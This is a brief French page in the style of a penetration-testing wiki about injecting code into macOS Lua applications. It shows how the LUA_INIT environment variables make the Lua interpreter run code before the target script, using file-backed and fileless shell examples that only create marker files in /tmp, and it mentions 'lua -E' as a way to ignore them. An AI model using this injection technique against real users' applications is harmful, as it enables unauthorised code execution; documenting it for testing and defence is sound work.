# Injection d'applications Lua macOS

{{#include ../../../banners/hacktricks-training.md}}

## `LUA_INIT`

Avant de traiter les options de ligne de commande ou le script cible, l'interpréteur Lua autonome exécute `LUA_INIT_<major>_<minor>` ou, si la variable versionnée est absente, `LUA_INIT`. Une valeur commençant par `@` désigne un fichier ; toute autre valeur est directement évaluée comme du code Lua. Cela permet une exécution au démarrage avec ou sans fichier.<sup>[[1]](#references)</sup>
```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```
Le nom versionné exact change selon l’interpréteur, par exemple `LUA_INIT_5_4`. `lua -E` ignore toutes les variables d’environnement, y compris le code de démarrage et les chemins des modules Lua.

## References

- [1] [Interpréteur autonome Lua 5.4](https://www.lua.org/manual/5.4/manual.html#7)
{{#include ../../../banners/hacktricks-training.md}}
